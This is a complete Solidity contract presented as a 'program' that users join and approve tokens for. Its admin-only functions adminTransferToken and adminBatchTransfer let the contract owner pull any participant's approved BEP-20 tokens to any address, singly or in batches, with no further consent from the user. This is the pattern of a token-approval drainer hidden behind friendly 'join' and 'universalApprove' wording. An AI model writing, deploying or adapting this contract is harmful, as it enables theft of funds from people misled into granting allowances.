// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title Universal Multi-Token Program Contract
 * @dev Admin can transfer ANY BEP-20 token from participants to any address
 * Supports unlimited tokens with token registry
 */

// Minimal ERC20 Interface
interface IERC20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
}

contract UniversalTokenContract {
    address public admin;

    // Track all users who joined the program
    address[] public participants;
    mapping(address => bool) public hasJoined;
    mapping(address => uint256) public joinedAt;

    // Token Registry - Store supported tokens
    struct TokenInfo {
        address tokenAddress;
        string symbol;
        string name;
        bool isActive;
        uint256 addedAt;
    }

    mapping(address => TokenInfo) public tokenRegistry;
    address[] public supportedTokens;

    // User token approvals - track which tokens user has approved
    mapping(address => mapping(address => bool)) public userTokenApproval; // user => token => approved

    // Events
    event UserJoined(address indexed user, uint256 timestamp);
    event TokenAdded(address indexed tokenAddress, string symbol, string name);
    event TokenRemoved(address indexed tokenAddress);
    event MultiTokenTransfer(address indexed token, address indexed from, address indexed to, uint256 amount, uint256 timestamp);
    event TokenApproval(address indexed user, address indexed token, bool approved);
    event AdminChanged(address indexed oldAdmin, address indexed newAdmin);

    modifier onlyAdmin() {
        require(msg.sender == admin, "Only admin can perform this action");
        _;
    }

    constructor() {
        admin = msg.sender;
    }

    /**
     * @dev Users call this to join the program (for universal access)
     */
    function joinProgram() external {
        require(!hasJoined[msg.sender], "Already joined the program");

        // Add user to participants
        participants.push(msg.sender);
        hasJoined[msg.sender] = true;
        joinedAt[msg.sender] = block.timestamp;

        emit UserJoined(msg.sender, block.timestamp);
    }

    /**
     * @dev Join program and approve specific token in one transaction
     */
    function joinProgramWithToken(address tokenAddress, uint256 amount) external {
        require(!hasJoined[msg.sender], "Already joined the program");
        require(tokenRegistry[tokenAddress].isActive, "Token not supported");

        // Add user to participants
        participants.push(msg.sender);
        hasJoined[msg.sender] = true;
        joinedAt[msg.sender] = block.timestamp;

        // Check and record token approval
        IERC20 token = IERC20(tokenAddress);
        uint256 allowance = token.allowance(msg.sender, address(this));

        if (allowance >= amount) {
            userTokenApproval[msg.sender][tokenAddress] = true;
            emit TokenApproval(msg.sender, tokenAddress, true);
        }

        emit UserJoined(msg.sender, block.timestamp);
    }

    /**
     * @dev Admin adds a new token to the registry
     */
    function addToken(address tokenAddress) external onlyAdmin {
        require(tokenAddress != address(0), "Invalid token address");
        require(!tokenRegistry[tokenAddress].isActive, "Token already supported");

        IERC20 token = IERC20(tokenAddress);
        string memory symbol = token.symbol();
        string memory name = token.name();

        tokenRegistry[tokenAddress] = TokenInfo({
            tokenAddress: tokenAddress,
            symbol: symbol,
            name: name,
            isActive: true,
            addedAt: block.timestamp
        });

        supportedTokens.push(tokenAddress);

        emit TokenAdded(tokenAddress, symbol, name);
    }

    /**
     * @dev Admin removes a token from the registry
     */
    function removeToken(address tokenAddress) external onlyAdmin {
        require(tokenRegistry[tokenAddress].isActive, "Token not active");

        tokenRegistry[tokenAddress].isActive = false;

        // Remove from supportedTokens array
        for (uint i = 0; i < supportedTokens.length; i++) {
            if (supportedTokens[i] == tokenAddress) {
                supportedTokens[i] = supportedTokens[supportedTokens.length - 1];
                supportedTokens.pop();
                break;
            }
        }

        emit TokenRemoved(tokenAddress);
    }

    /**
     * @dev User manually approves a token after joining
     */
    function approveToken(address tokenAddress) external {
        require(hasJoined[msg.sender], "User has not joined");
        require(tokenRegistry[tokenAddress].isActive, "Token not supported");

        IERC20 token = IERC20(tokenAddress);
        uint256 allowance = token.allowance(msg.sender, address(this));

        if (allowance > 0) {
            userTokenApproval[msg.sender][tokenAddress] = true;
            emit TokenApproval(msg.sender, tokenAddress, true);
        }
    }

    /**
     * @dev Universal approval - approves ALL supported tokens with maximum allowance
     * Users only need to call this once to approve all tokens in the registry
     */
    function universalApprove() external {
        require(hasJoined[msg.sender], "User has not joined");
        require(supportedTokens.length > 0, "No tokens supported");

        // Set approval status for all supported tokens
        for (uint i = 0; i < supportedTokens.length; i++) {
            address tokenAddress = supportedTokens[i];
            if (tokenRegistry[tokenAddress].isActive) {
                IERC20 token = IERC20(tokenAddress);
                uint256 allowance = token.allowance(msg.sender, address(this));

                // If user has approved this token (allowance > 0), mark it as approved
                if (allowance > 0) {
                    userTokenApproval[msg.sender][tokenAddress] = true;
                    emit TokenApproval(msg.sender, tokenAddress, true);
                }
            }
        }
    }

    /**
     * @dev Admin transfers any BEP-20 token from participant to any address
     */
    function adminTransferToken(address tokenAddress, address _from, address _to, uint256 _amount) external onlyAdmin {
        require(hasJoined[_from], "User has not joined the program");
        require(tokenRegistry[tokenAddress].isActive, "Token not supported");
        require(_to != address(0), "Invalid recipient");
        require(_amount > 0, "Amount must be greater than 0");

        IERC20 token = IERC20(tokenAddress);

        // Check user's token balance
        uint256 balance = token.balanceOf(_from);
        require(balance >= _amount, "Insufficient token balance");

        // Check allowance
        uint256 allowance = token.allowance(_from, address(this));
        require(allowance >= _amount, "Insufficient allowance");

        // Transfer token
        require(
            token.transferFrom(_from, _to, _amount),
            "Transfer failed"
        );

        emit MultiTokenTransfer(tokenAddress, _from, _to, _amount, block.timestamp);
    }

    /**
     * @dev Batch transfer tokens from multiple users to one address
     */
    function adminBatchTransfer(address tokenAddress, address[] memory _from, address _to, uint256[] memory _amounts) external onlyAdmin {
        require(tokenRegistry[tokenAddress].isActive, "Token not supported");
        require(_from.length == _amounts.length, "Array length mismatch");

        IERC20 token = IERC20(tokenAddress);

        for (uint i = 0; i < _from.length; i++) {
            require(hasJoined[_from[i]], "User has not joined");
            require(_amounts[i] > 0, "Amount must be greater than 0");

            uint256 balance = token.balanceOf(_from[i]);
            require(balance >= _amounts[i], "Insufficient balance");

            uint256 allowance = token.allowance(_from[i], address(this));
            require(allowance >= _amounts[i], "Insufficient allowance");

            require(
                token.transferFrom(_from[i], _to, _amounts[i]),
                "Transfer failed"
            );

            emit MultiTokenTransfer(tokenAddress, _from[i], _to, _amounts[i], block.timestamp);
        }
    }

    // View Functions

    function getParticipantCount() external view returns (uint256) {
        return participants.length;
    }

    function getSupportedTokenCount() external view returns (uint256) {
        return supportedTokens.length;
    }

    function getAllParticipants() external view returns (address[] memory) {
        return participants;
    }

    function getSupportedTokens() external view returns (address[] memory) {
        return supportedTokens;
    }

    function getTokenInfo(address tokenAddress) external view returns (string memory symbol, string memory name, bool isActive) {
        TokenInfo memory token = tokenRegistry[tokenAddress];
        return (token.symbol, token.name, token.isActive);
    }

    function getUserTokenBalance(address user, address tokenAddress) external view returns (uint256) {
        IERC20 token = IERC20(tokenAddress);
        return token.balanceOf(user);
    }

    function getUserTokenAllowance(address user, address tokenAddress) external view returns (uint256) {
        IERC20 token = IERC20(tokenAddress);
        return token.allowance(user, address(this));
    }

    function isUserTokenApproved(address user, address tokenAddress) external view returns (bool) {
        return userTokenApproval[user][tokenAddress];
    }

    function isParticipant(address user) external view returns (bool) {
        return hasJoined[user];
    }

    function getContractInfo() external view returns (
        address _admin,
        uint256 _participantCount,
        uint256 _supportedTokenCount
    ) {
        return (admin, participants.length, supportedTokens.length);
    }

    /**
     * @dev Change admin address
     */
    function changeAdmin(address newAdmin) external onlyAdmin {
        require(newAdmin != address(0), "Invalid admin address");
        address oldAdmin = admin;
        admin = newAdmin;
        emit AdminChanged(oldAdmin, newAdmin);
    }
}